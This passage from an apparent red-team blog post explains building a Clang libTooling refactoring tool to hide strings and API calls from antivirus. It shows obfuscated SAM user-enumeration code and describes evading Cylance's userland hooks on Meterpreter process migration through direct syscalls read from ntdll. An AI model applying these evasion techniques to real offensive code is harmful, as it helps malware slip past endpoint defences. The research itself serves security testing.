</span></span><span class="kwd"><span class="kwd">char</span></span><span class="pln"><span class="pln"> hid_SAMLIB_01zmejmkLCHt</span></span><span class="pun"><span class="pun">[]</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="str"><span class="str">'S'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'A'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'M'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'L'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'I'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'B'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'.'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'D'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'L'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'L'</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">};</span></span><span class="pln"><span class="pln">
</span></span><span class="kwd"><span class="kwd">char</span></span><span class="pln"><span class="pln"> hid_SamEnu_BZxlW5ZBUAAe</span></span><span class="pun"><span class="pun">[]</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="str"><span class="str">'S'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'m'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'E'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'n'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'u'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'m'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'U'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'s'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'s'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'I'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'n'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'D'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'m'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'n'</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">};</span></span><span class="pln"><span class="pln">
HANDLE hhid_SAMLIB_BZUriyLrlgrJ </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">LoadLibrary</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">hid_SAMLIB_01zmejmkLCHt</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
</span></span><span class="typ"><span class="typ">_SamEnumerateUsersInDomain</span></span><span class="pln"><span class="pln"> ffSamEnumerateUsersInDoma </span></span><span class="pun"><span class="pun">=(</span></span><span class="typ"><span class="typ">_SamEnumerateUsersInDomain</span></span><span class="pun"><span class="pun">)</span></span><span class="typ"><span class="typ">GetProcAddress</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">hhid_SAMLIB_BZUriyLrlgrJ</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> hid_SamEnu_BZxlW5ZBUAAe</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
enumStatus </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> ffSamEnumerateUsersInDoma</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">hDomain</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&amp;</span></span><span class="typ"><span class="typ">EnumerationContext</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&amp;</span></span><span class="pln"><span class="pln">pEnumBuffer</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="lit"><span class="lit">100</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&amp;</span></span><span class="typ"><span class="typ">CountRetourned</span></span><span class="pun"><span class="pun">);</span></span></code></pre>



<h3 class="wp-block-heading">Rewriting syscalls</h3>



<p>By default, using the <em>migrate</em> command of Meterpreter on a machine where Cylance is running triggers the antivirus detection (for now, just take our word for it). Cylance detects the process injection with a userland hook. To get around the detection, one can remove the hook, which seems to be the trending approach nowadays, or simply avoid it altogether. We found it simpler to read <em>ntdll</em>, recover the syscall number and insert it in a ready-to-call shellcode, which effectively gets around any antivirus’ userland’s hooks. To date, we have yet to find a Blue-Team that identifies <em>NTDLL.DLL</em> being read from disk as being “suspicious”.</p>



<h2 class="wp-block-heading">Implementation</h2>



<p>All the aforementioned ideas can be implemented in a source code refactoring tool based on <em>libTooling</em>. This section documents the way we did it, which is a compromise between time available and patience with the lack of <em>libTooling</em> documentation. So, there is room for improvements, and in case something looks off to you, it probably is and we would love to hear about it.</p>



<h3 class="wp-block-heading">Abstract Syntax Tree 101</h3>



<p>A compiler typically comprises several components, the most common ones being a <em>Parser</em> and a <em>Lexer</em>. When source code is fed to the compiler, it first generates a <em>Parse Tree</em> out of the original source code (what the programmer wrote), and then adds semantic information to the nodes (what the compiler truly needs). The result of this step is called an <em>Abstract Syntax Tree</em>. Wikipedia showcases the following example:</p>



<pre class="wp-block-code prettyprinted" style=""><code class=" prettyprinted" style=""><span class="kwd"><span class="kwd">while</span></span><span class="pln"><span class="pln"> b </span></span><span class="pun"><span class="pun">≠</span></span><span class="pln"><span class="pln"> </span></span><span class="lit"><span class="lit">0</span></span><span class="pln"><span class="pln">
  </span></span><span class="kwd"><span class="kwd">if</span></span><span class="pln"><span class="pln"> a </span></span><span class="pun"><span class="pun">&gt;</span></span><span class="pln"><span class="pln"> b
    a </span></span><span class="pun"><span class="pun">:=</span></span><span class="pln"><span class="pln"> a </span></span><span class="pun"><span class="pun">−</span></span><span class="pln"><span class="pln"> b
  </span></span><span class="kwd"><span class="kwd">else</span></span><span class="pln"><span class="pln">
    b </span></span><span class="pun"><span class="pun">:=</span></span><span class="pln"><span class="pln"> b </span></span><span class="pun"><span class="pun">−</span></span><span class="pln"><span class="pln"> a
</span></span><span class="kwd"><span class="kwd">return</span></span><span class="pln"><span class="pln"> a</span></span></code></pre>



<p>A typical AST for this small program would look like this:</p>


<div class="wp-block-image">
<figure class="aligncenter is-resized"><img decoding="async" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Abstract_syntax_tree_for_Euclidean_algorithm.svg/1920px-Abstract_syntax_tree_for_Euclidean_algorithm.svg.png" alt="" width="480" height="542"><figcaption class="wp-element-caption">Example of an Abstract Syntax Tree (<a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">https://en.wikipedia.org/wiki/Abstract_syntax_tree</a>)</figcaption></figure>
</div>


<p>This data structure allows for more precise algorithms when it comes to writing programs that understand properties of other programs, so it seems like a good choice to perform large scale code refactoring.</p>



<h4 class="wp-block-heading">Clang’s Abstract Syntax Tree</h4>



<p>Since we need to modify source code The Right Way<sup>TM</sup>, we will need to get acquainted with <em>Clang</em>‘s AST. The good news is that <em>Clang</em> exposes a command-line switch to dump the AST with pretty colours. The bad news is that for everything but toy projects, setting the correct compiler flags is… tricky.</p>



<p>For now, let us have a realistic yet simple enough test translation unit:</p>



<pre class="wp-block-code prettyprinted" style=""><code class=" prettyprinted" style=""><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">&lt;windows.h&gt;</span></span><span class="pln"><span class="pln">

</span></span><span class="kwd"><span class="kwd">typedef</span></span><span class="pln"><span class="pln"> NTSTATUS </span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">NTAPI </span></span><span class="pun"><span class="pun">*</span></span><span class="pln"><span class="pln">f_NtMapViewOfSection</span></span><span class="pun"><span class="pun">)(</span></span><span class="pln"><span class="pln">HANDLE</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> HANDLE</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> PVOID </span></span><span class="pun"><span class="pun">*,</span></span><span class="pln"><span class="pln"> ULONG</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> ULONG</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln">
PLARGE_INTEGER</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> PULONG</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> ULONG</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> ULONG</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> ULONG</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">

</span></span><span class="kwd"><span class="kwd">int</span></span><span class="pln"><span class="pln"> main</span></span><span class="pun"><span class="pun">(</span></span><span class="kwd"><span class="kwd">void</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln">
</span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">
    f_NtMapViewOfSection lNtMapViewOfSection</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">
    HMODULE ntdll</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">

    </span></span><span class="kwd"><span class="kwd">if</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">(!(</span></span><span class="pln"><span class="pln">ntdll </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">LoadLibrary</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">TEXT</span></span><span class="pun"><span class="pun">(</span></span><span class="str"><span class="str">"ntdll"</span></span><span class="pun"><span class="pun">))))</span></span><span class="pln"><span class="pln">
    </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">
        </span></span><span class="kwd"><span class="kwd">return</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">-</span></span><span class="lit"><span class="lit">1</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">
    </span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln">

    lNtMapViewOfSection </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">f_NtMapViewOfSection</span></span><span class="pun"><span class="pun">)</span></span><span class="typ"><span class="typ">GetProcAddress</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">ntdll</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"NtMapViewOfSection"</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
    lNtMapViewOfSection</span></span><span class="pun"><span class="pun">(</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
    </span></span><span class="kwd"><span class="kwd">return</span></span><span class="pln"><span class="pln"> </span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">
</span></span><span class="pun"><span class="pun">}</span></span></code></pre>



<p>Then, punch-in the following script into a <em>.sh</em> file (don’t ask how we came up with all those compiler flags, you will bring back painful memories):</p>



<pre class="wp-block-code prettyprinted" style=""><code class=" prettyprinted" style=""><span class="pln"><span class="pln">WIN_INCLUDE</span></span><span class="pun"><span class="pun">=</span></span><span class="str"><span class="str">"/Users/vladimir/headers/winsdk"</span></span><span class="pln"><span class="pln">
CLANG_PATH</span></span><span class="pun"><span class="pun">=</span></span><span class="str"><span class="str">"/usr/local/Cellar/llvm/9.0.1"</span></span><span class="com"><span class="com">#"/usr/lib/clang/8.0.1/"</span></span><span class="pln"><span class="pln">

clang </span></span><span class="pun"><span class="pun">-</span></span><span class="pln"><span class="pln">cc1 </span></span><span class="pun"><span class="pun">-</span></span><span class="pln"><span class="pln">ast</span></span><span class="pun"><span class="pun">-</span></span><span class="kwd"><span class="kwd">dump</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"$1"</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">-</span></span><span class="pln"><span class="pln">D </span></span><span class="str"><span class="str">"_WIN64"</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">-</span></span><span class="pln"><span class="pln">D </span></span><span class="str"><span class="str">"_UNICODE"</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">-</span></span><span class="pln"><span class="pln">D </span></span><span class="str"><span class="str">"UNICODE"</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">-</span></span><span class="pln"><span class="pln">D </span></span><span class="str"><span class="str">"_WINSOCK_DEPRECATED_NO_WARNINGS"</span></span><span class="pln"><span class="pln">\
  </span></span><span class="str"><span class="str">"-I"</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"$CLANG_PATH/include"</span></span><span class="pln"><span class="pln"> \
  </span></span><span class="str"><span class="str">"-I"</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"$CLANG_PATH"</span></span><span class="pln"><span class="pln"> \
  </span></span><span class="str"><span class="str">"-I"</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"$WIN_INCLUDE/Include/msvc-14.15.26726-include"</span></span><span class="pln"><span class="pln">\
  </span></span><span class="str"><span class="str">"-I"</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"$WIN_INCLUDE/Include/10.0.17134.0/ucrt"</span></span><span class="pln"><span class="pln"> \
  </span></span><span class="str"><span class="str">"-I"</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"$WIN_INCLUDE/Include/10.0.17134.0/shared"</span></span><span class="pln"><span class="pln"> \
  </span></span><span class="str"><span class="str">"-I"</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"$WIN_INCLUDE/Include/10.0.17134.0/um"</span></span><span class="pln"><span class="pln"> \
  </span></span><span class="str"><span class="str">"-I"</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"$WIN_INCLUDE/Include/10.0.17134.0/winrt"</span></span><span class="pln"><span class="pln"> \
  </span></span><span class="str"><span class="str">"-fdeprecated-macro"</span></span><span class="pln"><span class="pln"> \
  </span></span><span class="str"><span class="str">"-w"</span></span><span class="pln"><span class="pln"> \
  </span></span><span class="str"><span class="str">"-fdebug-compilation-dir"</span></span><span class="pln"><span class="pln">\
  </span></span><span class="str"><span class="str">"-fno-use-cxa-atexit"</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"-fms-extensions"</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"-fms-compatibility"</span></span><span class="pln"><span class="pln"> \
  </span></span><span class="str"><span class="str">"-fms-compatibility-version=19.15.26726"</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"-std=c++14"</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"-fdelayed-template-parsing"</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"-fobjc-runtime=gcc"</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"-fcxx-exceptions"</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"-fexceptions"</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"-fseh-exceptions"</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"-fdiagnostics-show-option"</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"-fcolor-diagnostics"</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"-x"</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"c++"</span></span></code></pre>



<p>Notice that <em>WIN_INCLUDE</em> points to a folder containing all the required headers to interact with the Win32 API. These were taken as-is from a standard Windows 10 install, and to save you some headaches, we recommend that you do the same instead of opting for MinGW’s ones. Then, call the script with the test C file as argument. While this produces a 18MB file, it is easy enough to navigate to the interesting part of the AST by searching for one of the string literals we defined, for instance “<em>NtMapViewOfSection</em>“:</p>



<figure class="wp-block-image fbx-instance"><a href="https://blog.scrt.ch/wp-content/uploads/2020/06/output.png" class="fbx-link"><img loading="lazy" decoding="async" width="1024" height="503" src="https://blog.scrt.ch/wp-content/uploads/2020/06/output-1024x503.png" alt="" class="wp-image-2601"></a></figure>



<p>Now that we have a way to visualise the AST, it is much simpler to understand how we will have to update the nodes to achieve our result, without introducing any syntax errors in the resulting source code. The subsequent sections contain the implementation details related to AST manipulation with <em>libTooling</em>.</p>



<h4 class="wp-block-heading">ClangTool boilerplate</h4>



<p>Unsurprisingly, there is some required boilerplate code before getting into the interesting stuff, so punch-in the following code into <em>main.cpp</em>:</p>



<pre class="wp-block-code prettyprinted" style=""><code class=" prettyprinted" style=""><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/AST/ASTConsumer.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/AST/ASTContext.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/AST/Decl.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/AST/Type.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/ASTMatchers/ASTMatchFinder.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/ASTMatchers/ASTMatchers.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/Basic/SourceManager.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/Frontend/CompilerInstance.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/Frontend/FrontendAction.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/Tooling/CommonOptionsParser.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/Tooling/Tooling.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"clang/Rewrite/Core/Rewriter.h"</span></span><span class="pln"><span class="pln">

</span></span><span class="com"><span class="com">// LLVM includes</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"llvm/ADT/ArrayRef.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"llvm/ADT/StringRef.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"llvm/Support/CommandLine.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"llvm/Support/raw_ostream.h"</span></span><span class="pln"><span class="pln">

</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"Consumer.h"</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">"MatchHandler.h"</span></span><span class="pln"><span class="pln">

</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">&lt;iostream&gt;</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">&lt;memory&gt;</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">&lt;string&gt;</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">&lt;vector&gt;</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">&lt;fstream&gt;</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">&lt;clang/Tooling/Inclusions/IncludeStyle.h&gt;</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">&lt;clang/Tooling/Inclusions/HeaderIncludes.h&gt;</span></span><span class="pln"><span class="pln">
</span></span><span class="com"><span class="com">#include</span></span><span class="pln"><span class="pln"> </span></span><span class="str"><span class="str">&lt;sstream&gt;</span></span><span class="pln"><span class="pln">

</span></span><span class="kwd"><span class="kwd">namespace</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">ClSetup</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">
    llvm</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">cl</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">OptionCategory</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">ToolCategory</span></span><span class="pun"><span class="pun">(</span></span><span class="str"><span class="str">"StringEncryptor"</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
</span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln">

</span></span><span class="kwd"><span class="kwd">namespace</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">StringEncryptor</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">

    clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">Rewriter</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">ASTRewriter</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">
    </span></span><span class="kwd"><span class="kwd">class</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">Action</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">:</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">public</span></span><span class="pln"><span class="pln"> clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">ASTFrontendAction</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">

    </span></span><span class="kwd"><span class="kwd">public</span></span><span class="pun"><span class="pun">:</span></span><span class="pln"><span class="pln">
        </span></span><span class="kwd"><span class="kwd">using</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">ASTConsumerPointer</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> std</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">unique_ptr</span></span><span class="pun"><span class="pun">&lt;</span></span><span class="pln"><span class="pln">clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">ASTConsumer</span></span><span class="pun"><span class="pun">&gt;;</span></span><span class="pln"><span class="pln">

        </span></span><span class="typ"><span class="typ">ASTConsumerPointer</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">CreateASTConsumer</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">clang</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">CompilerInstance</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">&amp;</span></span><span class="typ"><span class="typ">Compiler</span></span><span class="pun"><span class="pun">,</span></span><span class="pln"><span class="pln">
                                             llvm</span></span><span class="pun"><span class="pun">::</span></span><span class="typ"><span class="typ">StringRef</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">Filename</span></span><span class="pun"><span class="pun">)</span></span><span class="pln"><span class="pln"> </span></span><span class="kwd"><span class="kwd">override</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="pln"><span class="pln">

            </span></span><span class="typ"><span class="typ">ASTRewriter</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">setSourceMgr</span></span><span class="pun"><span class="pun">(</span></span><span class="typ"><span class="typ">Compiler</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">getSourceManager</span></span><span class="pun"><span class="pun">(),</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">Compiler</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">getLangOpts</span></span><span class="pun"><span class="pun">());</span></span><span class="pln"><span class="pln">
            std</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">vector</span></span><span class="pun"><span class="pun">&lt;</span></span><span class="typ"><span class="typ">ASTConsumer</span></span><span class="pun"><span class="pun">*&gt;</span></span><span class="pln"><span class="pln"> consumers</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">

            consumers</span></span><span class="pun"><span class="pun">.</span></span><span class="pln"><span class="pln">push_back</span></span><span class="pun"><span class="pun">(&amp;</span></span><span class="typ"><span class="typ">StringConsumer</span></span><span class="pun"><span class="pun">);</span></span><span class="pln"><span class="pln">
  
            </span></span><span class="com"><span class="com">// several passes can be combined together by adding them to `consumers`</span></span><span class="pln"><span class="pln">
            </span></span><span class="kwd"><span class="kwd">auto</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">TheConsumer</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> llvm</span></span><span class="pun"><span class="pun">::</span></span><span class="pln"><span class="pln">make_unique</span></span><span class="pun"><span class="pun">&lt;</span></span><span class="typ"><span class="typ">Consumer</span></span><span class="pun"><span class="pun">&gt;();</span></span><span class="pln"><span class="pln">
            </span></span><span class="typ"><span class="typ">TheConsumer</span></span><span class="pun"><span class="pun">-&gt;</span></span><span class="pln"><span class="pln">consumers </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> consumers</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">
            </span></span><span class="kwd"><span class="kwd">return</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">TheConsumer</span></span><span class="pun"><span class="pun">;</span></span><span class="pln"><span class="pln">
        </span></span><span class="pun"><span class="pun">}</span></span><span class="pln"><span class="pln">

